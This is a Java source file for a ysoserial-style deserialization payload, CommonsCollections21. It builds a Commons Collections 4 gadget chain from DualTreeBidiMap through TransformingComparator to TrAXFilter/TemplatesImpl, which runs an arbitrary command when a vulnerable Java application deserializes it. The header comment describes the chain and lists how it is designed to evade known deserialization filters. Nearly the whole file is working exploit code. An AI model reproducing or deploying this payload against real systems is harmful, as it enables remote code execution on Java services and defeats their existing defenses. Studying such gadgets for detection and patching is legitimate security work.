package ysoserial.payloads;

import java.io.Serializable;
import java.util.TreeMap;

import javax.xml.transform.Templates;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.bidimap.DualTreeBidiMap;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	DualTreeBidiMap (CC4) entry point with TransformingComparator dispatch.
	Bypasses all standard entry point filters including TreeBag.

	Gadget chain:
		ObjectInputStream.readObject()
			DualTreeBidiMap.readObject()
				DualTreeBidiMap.createBidiMap()    // creates internal TreeMaps
				TreeMap.put(key, value)
					TreeMap.compare()
						TransformingComparator.compare()
							ChainedTransformer.transform()
								ConstantTransformer -> TrAXFilter.class
								InstantiateTransformer -> new TrAXFilter(TemplatesImpl)
									TemplatesImpl.newTransformer()
										... -> RCE

	DualTreeBidiMap has its own readObject/writeObject.
	It stores a Comparator and entries. On readObject, it creates two internal
	TreeMaps with the stored Comparator, then re-inserts all entries.
	TreeMap.put() calls compare() for ordering, triggering the chain.

	Filter evasion:
		1. DualTreeBidiMap (o.a.c.c4.bidimap) — not in any known filter
		2. No HashMap/HashSet/Hashtable/PriorityQueue/TreeBag/TreeMap in stream
		3. No InvokerTransformer (InstantiateTransformer sink)
		4. No LazyMap/TiedMapEntry/DefaultedMap
		5. Comparator dispatch like CC8/CC16 but completely different entry class

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-collections4 4.0+
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections21 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		// Safe transformer for construction
		InvokerTransformer safeTransformer = new InvokerTransformer(
			"toString", new Class[0], new Object[0]);
		TransformingComparator comp = new TransformingComparator(safeTransformer);

		// DualTreeBidiMap — novel entry point from bidimap package
		// It uses the provided Comparator for its internal TreeMaps
		DualTreeBidiMap bidi = new DualTreeBidiMap(comp, comp);
		bidi.put(1, "a");  // first entry — no compare call in TreeMap
		bidi.put(2, "b");  // second entry — compare(2, 1) via toString, safe

		// Armed chain: TrAXFilter(TemplatesImpl) — avoids InvokerTransformer in payload
		ConstantTransformer constant = new ConstantTransformer(TrAXFilter.class);
		InstantiateTransformer instantiate = new InstantiateTransformer(
			new Class[]{ Templates.class }, new Object[]{ templates });
		ChainedTransformer chain = new ChainedTransformer(
			new Transformer[]{ constant, instantiate });

		// Swap transformer — only ChainedTransformer+InstantiateTransformer are serialized
		Reflections.setFieldValue(comp, "transformer", chain);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections21.class, args);
	}
}
